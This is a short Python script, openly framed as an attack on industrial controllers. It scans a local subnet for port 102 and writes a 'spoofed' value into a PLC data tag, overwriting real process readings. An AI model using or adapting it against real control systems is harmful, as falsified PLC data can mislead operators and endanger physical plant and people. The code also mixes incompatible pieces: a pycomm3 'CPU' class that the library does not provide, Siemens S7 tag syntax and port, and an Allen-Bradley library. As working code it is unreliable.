import socket
import pycomm3
from pycomm3 import LogixDriver, SLC500Driver, PLC

# Function to discover the PLC's IP address
def discover_plc_ip():
    # Define the subnet and range to scan
    subnet = "192.168.1."
    start_ip = 1
    end_ip = 254

    for i in range(start_ip, end_ip + 1):
        ip = f"{subnet}{i}"
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                result = s.connect_ex((ip, 102))  # Port 102 is the default for S7 communication
                if result == 0:
                    print(f"PLC found at IP: {ip}")
                    return ip
        except socket.error:
            continue
    print("PLC not found in the specified range.")
    return None

# Function to spoof reporting messages
def spoof_reporting_message(plc_ip, tag_name, value):
    try:
        with pycomm3.CPU(plc_ip, rack=0, slot=1) as plc:
            # Read the current value of the tag
            current_value = plc.read(tag_name)
            print(f"Current value of {tag_name}: {current_value}")

            # Write the spoofed value to the tag
            plc.write(tag_name, value)
            print(f"Spoofed value of {tag_name} to: {value}")

            # Read the value again to confirm
            new_value = plc.read(tag_name)
            print(f"New value of {tag_name}: {new_value}")
    except Exception as e:
        print(f"Error: {e}")

# Main function
def main():
    # Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if plc_ip is None:
        return

    # Define the tag name and the spoofed value
    tag_name = "DB100.DBW0"  # Example tag name, adjust as needed
    spoofed_value = 12345  # Example spoofed value, adjust as needed

    # Spoof the reporting message
    spoof_reporting_message(plc_ip, tag_name, spoofed_value)

if __name__ == "__main__":
    main()